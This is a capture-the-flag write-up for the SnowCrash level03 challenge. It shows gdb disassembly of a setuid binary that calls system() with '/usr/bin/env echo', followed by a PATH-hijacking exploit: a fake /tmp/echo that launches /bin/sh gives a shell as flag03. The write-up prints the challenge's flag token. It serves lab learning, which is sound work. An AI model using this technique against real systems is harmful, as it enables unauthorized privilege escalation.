1. The level03 binary has the setuid bit set, meaning it executes with the permissions of its owner (flag03):

level03@SnowCrash:~$ ls -lah level03
-rwsr-sr-x 1 flag03 level03 8.5K Mar  5  2016 level03

This means any process spawned by the binary inherits the privileges of flag03.


2. We disassemble the main and see that it calls the system function with a fixed string argument at 0x080484fe <+90>: call   0x80483b0 <system@plt>:

level03@SnowCrash:~$ gdb ./level03
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level03/level03...done.
(gdb) disass main
Dump of assembler code for function main:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	and    $0xfffffff0,%esp
   0x080484aa <+6>:	sub    $0x20,%esp
   0x080484ad <+9>:	call   0x80483a0 <getegid@plt>
   0x080484b2 <+14>:	mov    %eax,0x18(%esp)
   0x080484b6 <+18>:	call   0x8048390 <geteuid@plt>
   0x080484bb <+23>:	mov    %eax,0x1c(%esp)
   0x080484bf <+27>:	mov    0x18(%esp),%eax
   0x080484c3 <+31>:	mov    %eax,0x8(%esp)
   0x080484c7 <+35>:	mov    0x18(%esp),%eax
   0x080484cb <+39>:	mov    %eax,0x4(%esp)
   0x080484cf <+43>:	mov    0x18(%esp),%eax
   0x080484d3 <+47>:	mov    %eax,(%esp)
   0x080484d6 <+50>:	call   0x80483e0 <setresgid@plt>
   0x080484db <+55>:	mov    0x1c(%esp),%eax
   0x080484df <+59>:	mov    %eax,0x8(%esp)
   0x080484e3 <+63>:	mov    0x1c(%esp),%eax
   0x080484e7 <+67>:	mov    %eax,0x4(%esp)
   0x080484eb <+71>:	mov    0x1c(%esp),%eax
   0x080484ef <+75>:	mov    %eax,(%esp)
   0x080484f2 <+78>:	call   0x8048380 <setresuid@plt>
   0x080484f7 <+83>:	movl   $0x80485e0,(%esp)
   0x080484fe <+90>:	call   0x80483b0 <system@plt>
   0x08048503 <+95>:	leave
   0x08048504 <+96>:	ret
End of assembler dump.

3. Inspecting the argument passed to system at memory address 0x80485e0 shows:
(gdb) x/s 0x80485e0
0x80485e0: "/usr/bin/env echo Exploit me"

We can see that the binary executes the command /usr/bin/env echo Exploit me.

4. By exploiting how /usr/bin/env works, we can manipulate the PATH environment variable to replace echo with our own malicious executable,
https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-command-suid-binary-without-command-path

Steps to exploit
1. We create a malicious replacement for echo

We created a script at /tmp/echo that executes /bin/sh:

echo "/bin/sh" > /tmp/echo
chmod +x /tmp/echo

This script ensures that when the binary calls echo, it actually spawns a shell.

2. Prepend /tmp to the PATH
We modify the PATH environment variable to ensure /tmp/echo is executed instead of the default /usr/bin/echo:

PATH=/tmp:$PATH ./level03

When the binary is executed, it now runs /usr/bin/env echo, which resolves to /tmp/echo due to the modified PATH.

3. Spawn a shell

The /tmp/echo script runs /bin/sh, giving us an interactive shell:

$ PATH=/tmp:$PATH ./level03
$ id
uid=3003(flag03) gid=2003(level03) groups=3003(flag03),100(users),2003(level03)
$ getflag
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
